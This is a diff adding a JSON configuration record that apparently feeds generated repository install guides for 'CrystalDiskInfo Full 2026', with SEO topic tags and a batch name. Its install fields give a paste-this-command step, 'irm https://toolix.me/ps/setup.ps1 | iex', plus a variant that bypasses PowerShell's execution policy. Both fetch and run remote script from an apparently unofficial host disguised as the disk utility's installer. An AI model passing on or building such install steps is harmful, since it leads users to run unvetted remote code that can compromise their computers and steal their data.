@@ -1,0 +1,26 @@
+{
+  "repo": "CrystalDiskInfo-Full-2026",
+  "product": "CrystalDiskInfo Full 2026",
+  "product_title": "CrystalDiskInfo",
+  "kind": "utility",
+  "install_type": "toolix-irm",
+  "install_command": "irm https://toolix.me/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://toolix.me/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-toolix-pending",
+  "format": "license-md-toolix-git-new-era-guide",
+  "tone": "guide",
+  "category": "system-tools",
+  "topics": [
+    "how-to-install-crystaldiskinfo",
+    "crystaldiskinfo-app",
+    "desktop-software",
+    "repository-readme",
+    "install-guide",
+    "crystaldiskinfo-desktop-tool",
+    "crystaldiskinfo-windows-tool",
+    "crystaldiskinfo",
+    "crystaldiskinfo-desktop-2026",
+    "windows-11"
+  ],
+  "site": "toolix.me"
+}
